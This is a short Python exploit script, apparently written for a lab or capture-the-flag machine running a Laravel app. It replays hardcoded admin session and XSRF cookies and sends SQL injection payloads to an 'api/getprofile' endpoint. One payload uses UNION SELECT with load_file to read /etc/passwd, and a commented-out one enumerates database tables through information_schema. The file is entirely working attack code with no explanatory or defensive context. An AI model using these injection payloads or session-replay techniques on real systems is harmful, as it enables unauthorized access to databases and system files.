#!/usr/bin/python3

from pprint import pprint
import requests
import sys

MAIN_URL = "http://10.10.11.159/"


def main():

    # retrieving the information
    ress = requests.get(url=MAIN_URL)
    

    # once we've been accepted as the admin
    # we need the cookies from it
    admin_cookies = {"XSRF-TOKEN":"eyJpdiI6IjdNTW05ekxnSTZLNGRQWElVSnNlWHc9PSIsInZhbHVlIjoieXZaZEx6engxSFVwdnRDTnN3RWQrWGdRVjh3aHpkRjk1SGNaTVZaUnVabFZXdGdjQXBkUSsyVUZaQkZ2clFsWmFvZml6TysxWlFJZjM0VGZDeEhDOE1KWkFDZXNOMEtRYUF5Z2NFTUNOMyszeWJaN0p4TmlDUWpYeXRRb1dVTEYiLCJtYWMiOiJlYjdmYjMzNzFhNDhlNDczZmQxOGJhY2Q4YTMyYThhMjIyYzA3MjM1MjQ5YWRiNWRhODViMWZjMmMwNzQxMDdiIiwidGFnIjoiIn0%3D", "laravel_session":"eyJpdiI6Ikx6YjZVWmVHWE5hc2JDS09hV0crckE9PSIsInZhbHVlIjoiNFNYVFJ0dytGSWVCaHBQU1Z4a1haK2NsclhJaHI0bEJaVkRNYWVDOCs1M0RZRzk2YVhvODJzQWJZQk9leld2aDdjL1hpekMxck83djB5SllXMUpiU1dCZTk4cERnc2hRbkFMWUVWY1hPQ0t0ZXRhQ1FBWlQrYUYwT0ZKWHZCMzIiLCJtYWMiOiI1YjBhNjhkNWJjMzhmNWIxZjlhN2NiYzMxNDU1MTJkY2M5ZWE2MTViOGYwYWE2ZjlmNzNjNjJiMGRhNzU3YTY0IiwidGFnIjoiIn0%3D"}
    data = {
            "id":"0 union select 1,2,load_file('/etc/passwd')",
            "secret":"true"
        }
    """data = {
            "id":"0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='uhc'-- -",
            "secret":"true"
        }

    """
    new_ress = requests.get(url=MAIN_URL+"api/getprofile", data=data, cookies=admin_cookies, headers={"Content-Type": "application/json"})
    print(new_ress.text)

    

if __name__ == "__main__":
    main()
